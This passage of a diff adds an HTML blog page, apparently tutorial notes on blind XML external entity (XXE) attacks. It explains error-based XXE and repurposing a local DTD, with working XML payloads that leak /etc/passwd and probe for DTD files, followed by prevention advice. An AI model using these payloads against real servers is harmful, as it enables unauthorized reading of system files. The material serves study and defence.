+<li>Uses the <code>eval</code> entity, which causes the dynamic declaration of the <code>error</code> entity to be performed.</li>
+<li>Uses the <code>error</code> entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the <code>/etc/passwd</code> file.</li>
+</ul>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages"></a></p>
+<h3 id="exploiting-blind-xxe-by-repurposing-a-local-dtd">Exploiting blind XXE by repurposing a local DTD</h3>
+<p>For example, suppose there is a DTD file on the server filesystem at the location <code>/usr/local/app/schema.dtd</code>, and this DTD file defines an entity called <code>custom_entity</code>
+. An attacker can trigger an XML parsing error message containing the contents of the <code>/etc/passwd</code> file by submitting a hybrid DTD like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/local/app/schema.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % custom_entity &#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>&amp;#x25;eval;
+</span></span><span style="display:flex;"><span>&amp;#x25;error;
+</span></span><span style="display:flex;"><span>&#39;&gt;
+</span></span><span style="display:flex;"><span>%local_dtd;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>his DTD carries out the following steps:</p>
+<ul>
+<li>Defines an XML parameter entity called <code>local_dtd</code>, containing the contents of the external DTD file that exists on the server filesystem.</li>
+<li>Redefines the XML parameter entity called <code>custom_entity</code>, which is already defined in the external DTD file. The entity is redefined as containing the <a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">error-based XXE exploit</a> that was already described, for triggering an error message containing the contents of the <code>/etc/passwd</code> file.</li>
+<li>Uses the <code>local_dtd</code> entity, so that the external DTD is interpreted, including the redefined value of the <code>custom_entity</code> entity. This results in the desired error message.</li>
+</ul>
+<h3 id="locating-an-existing-dtd-file-to-repurpose">Locating an existing DTD file to repurpose</h3>
+<p>Since this XXE attack involves repurposing an existing DTD  on the server filesystem, a key requirement is to locate a suitable  file. This is actually quite straightforward. Because the application 
+returns any error messages thrown by the XML parser, you can easily  enumerate local DTD files just by attempting to load them from within  the internal DTD.</p>
+<p>For example, Linux systems using the GNOME desktop environment often have a DTD file at <code>/usr/share/yelp/dtd/docbookx.dtd</code>.You can test whether this file is present by submitting the following 
+XXE payload, which will cause an error if the file is missing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>%local_dtd;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span></code></pre></div><p>After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common 
+systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search.</p>
+<p><a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">Lab: Exploiting XXE to retrieve data by repurposing a local DTD Web Security Academy</a></p>
+<hr>
+<h1 id="prevention">Prevention</h1>
+<p>Preventing XXEs is all about limiting the capabilities of an XML parser.</p>
+<p>For example, if you’re using the default PHP XML parser, you need to set <code>libxml_disable_entity_loader</code> to TRUE to disable the use of external entities. For more information on how to do it for your parser, consult the OWASP Cheat Sheet at</p>
+<p><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md">CheatSheetSeries/XML_External_Entity_Prevention_Cheat_Sheet.md at master · OWASP/CheatSheetSeries</a></p>
+<p>You could create an <code>allowlist</code> for user-supplied values that are passed into XML documents, or sanitize potentially hostile data within XML documents, headers, or nodes.
+Alternatively, you can use less complex data formats like JSON instead of XML whenever possible.</p>
+<p>Generally, it is sufficient to disable resolution of external entities and disable support for <code>XInclude</code>. This can usually be done via configuration options or by programmatically overriding default behavior.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
